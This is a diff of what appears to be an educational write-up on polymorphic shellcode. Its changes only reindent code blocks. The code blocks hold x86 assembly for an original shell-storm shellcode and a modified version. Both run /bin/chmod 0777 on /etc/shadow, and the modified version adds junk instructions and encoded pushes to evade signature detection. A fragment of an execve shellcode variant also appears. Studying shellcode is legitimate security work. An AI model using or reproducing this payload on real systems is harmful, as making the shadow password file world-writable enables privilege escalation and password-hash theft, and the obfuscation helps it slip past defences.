@@ -75,7 +75,7 @@ First one is a polymorphic version of the _**`execve()`**_ of the following [she
     0000002A  CD80              int 0x80
 ```
 
-And my changed version : 
+And my changed version:
 ```c
     xor eax,eax
     mov ebx, eax            ; xor ebx,ebx
@@ -111,62 +111,62 @@ I've changed how registers are zeroed and how values were pushed on the stack an
 
 The next [shellcode](http://shell-storm.org/shellcode/files/shellcode-828.php) changes the permissions of _`/etc/shadow`_ file: 
 ```c
-xor    %eax,%eax
-push   %eax
-pushl  $0x776f6461
-pushl  $0x68732f2f
-pushl  $0x6374652f
-movl   %esp,%esi
-push   %eax
-pushl  $0x37373730
-movl   %esp,%ebp
-push   %eax
-pushl  $0x646f6d68
-pushl  $0x632f6e69
-pushl  $0x622f2f2f
-mov    %esp,%ebx
-pushl  %eax
-pushl  %esi
-pushl  %ebp
-pushl  %ebx
-movl   %esp,%ecx
-mov    %eax,%edx
-mov    $0xb,%al
-int    $0x80
+    xor    %eax,%eax
+    push   %eax
+    pushl  $0x776f6461
+    pushl  $0x68732f2f
+    pushl  $0x6374652f
+    movl   %esp,%esi
+    push   %eax
+    pushl  $0x37373730
+    movl   %esp,%ebp
+    push   %eax
+    pushl  $0x646f6d68
+    pushl  $0x632f6e69
+    pushl  $0x622f2f2f
+    mov    %esp,%ebx
+    pushl  %eax
+    pushl  %esi
+    pushl  %ebp
+    pushl  %ebx
+    movl   %esp,%ecx
+    mov    %eax,%edx
+    mov    $0xb,%al
+    int    $0x80
 ```
 
 And my changed version: 
 ```c
-xor eax,eax
-push eax
-push dword 0x776f6461
-mov esi, 0x56611d1d         ; push dword 0x68732f2f
-lea edi, [esi]              ; junk
-add esi, 0x12121212
-push esi
-push dword 0x6374652f       ; '/etc/shadow'
-mov esi,esp
-push eax
-push dword 0x37373730       ; 0777
-mov ebp,esp
-push eax
-push dword 0x646f6d68
-mov edi, 0x030f0e09         ; push dword 0x632f6e69       
-add edi, 0x60206060
-push edi
-push word 0x622f            ; /bin/chmod
-mov ebx,esp
-push eax
-push esi
-push ebp
-push ebx
-mov ecx,esp
-mov edx,eax
-xor eax, eax                ; mov al,0xb
-add al, 0xa
-add al, 0x1
-xchg ecx, ecx               ; NOP added
-int 0x80
+    xor eax,eax
+    push eax
+    push dword 0x776f6461
+    mov esi, 0x56611d1d         ; push dword 0x68732f2f
+    lea edi, [esi]              ; junk
+    add esi, 0x12121212
+    push esi
+    push dword 0x6374652f       ; '/etc/shadow'
+    mov esi,esp
+    push eax
+    push dword 0x37373730       ; 0777
+    mov ebp,esp
+    push eax
+    push dword 0x646f6d68
+    mov edi, 0x030f0e09         ; push dword 0x632f6e69       
+    add edi, 0x60206060
+    push edi
+    push word 0x622f            ; /bin/chmod
+    mov ebx,esp
+    push eax
+    push esi
+    push ebp
+    push ebx
+    mov ecx,esp
+    mov edx,eax
+    xor eax, eax                ; mov al,0xb
+    add al, 0xa
+    add al, 0x1
+    xchg ecx, ecx               ; NOP added
+    int 0x80
 ```
 
 ## 3. Reboot
